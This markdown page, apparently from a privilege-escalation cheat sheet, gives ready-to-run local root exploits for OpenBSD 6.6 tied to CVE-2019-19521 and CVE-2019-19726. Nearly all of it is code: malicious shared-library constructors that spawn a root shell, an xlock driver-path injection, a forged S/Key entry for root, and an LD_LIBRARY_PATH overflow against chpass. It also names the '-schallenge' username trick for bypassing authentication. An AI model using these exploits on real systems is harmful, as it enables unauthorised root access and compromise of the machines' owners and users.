# OpenBSD

### [CVE-2019-19521](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt)

Works in OpenBSD 6.6.

```bash
cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF
gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c
env -i /usr/X11R6/bin/Xvfb :82 -cc 0 &
env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :82
echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
chmod 0600 /etc/skey/root
env -i TERM=vt220 su -l -a skey
EGG LARD GROW HOG DRAG LAIN
id
```

If login\_passwd is used we can provide the username `-schallenge` to bypass authentication.

### [CVE-2019-19726](https://www.exploit-db.com/exploits/47780)

Works on OpenBSD 6.6.

```bash
cd /tmp
cat > lib.c << "EOF"
#include <paths.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    if (setuid(0) != 0) _exit(__LINE__);
    if (setgid(0) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

gcc -fpic -shared -s -o libutil.so.13.1 lib.c

cat > poc.c << "EOF"
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>

int
main(int argc, char * const * argv)
{
    #define LLP "LD_LIBRARY_PATH=."
    static char llp[ARG_MAX - 128];
    memset(llp, ':', sizeof(llp)-1);
    memcpy(llp, LLP, sizeof(LLP)-1);
    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };

    #define DATA (ARG_MAX * sizeof(char *))
    const struct rlimit data = { DATA, DATA };
    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);

    if (argc <= 1) _exit(__LINE__);
    argv += 1;
    execve(argv[0], argv, envp);
    _exit(__LINE__);
}
EOF
gcc -s -o poc poc.c
./poc /usr/bin/chpass
```

